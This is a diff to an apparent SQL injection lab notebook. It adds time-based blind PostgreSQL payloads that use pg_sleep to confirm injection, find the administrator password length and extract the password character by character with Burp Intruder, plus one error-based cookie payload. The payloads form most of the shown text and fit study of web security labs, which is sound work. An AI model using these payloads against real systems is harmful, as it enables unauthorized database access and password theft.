@@ -306,4 +306,19 @@ Cookie: TrackingId='+AND+1%3dCAST((SELECT+password+from+users+LIMIT+1)+as+int)--
 ```bash
 # First check all the time delays with different DB types
 
+' || pg_sleep(10)--  # Confirms that parameter is vulnerable or not 
+' || (select case when (1=1) then pg_sleep(10) else pg_sleep(-1) end)-- # True sleep for 10 seconds
+' || (select case when (1=0) then pg_sleep(10) else pg_sleep(-1) end)-- # False Don't sleep for 10 seconds
+' || (select case when (username='administrator') then pg_sleep(10) else pg_sleep(-1) end from users)--  # Users table with adminstrator user is available
+' || (select case when (username='administrator' and LENGTH(password)>1) then pg_sleep(10) else pg_sleep(-1) end from users)--   # Enumerate password length
+' || (select case when (username='administrator' and LENGTH(password)>25) then pg_sleep(10) else pg_sleep(-1) end from users)-- # bigger then 1 and smaller then 25
+# Brute force with intruder with 1 to 25, Set then resources pool one per max concurrent requests
+# All trure cases sleep for 10 seconds so password length is 20 don't sleep for 10 besonds because password>20, not greater then
+' || (select case when (username='administrator' and substring(password,1,1)='$a$') then pg_sleep(10) else pg_sleep(-1) end from users)-- # It will check the first character password in between $ signs
+' || (select case when (username='administrator' and substring(password,$1$,1)='$a$') then pg_sleep(5) else pg_sleep(-1) end from users)-- # It will check the 20 character entire password in between $ signs, Reduced sleep to 5 
 ```
+- Password finds below formart, here example password this case ```xtoy3o7zaqn9bvzqyolc```
+    - Payload 1 show password character length number 
+    - Payload 2 show actual password of password character length number from payload
+
+![BurpSuite Intruder Password](Images/Burp_Intruder_password.png)
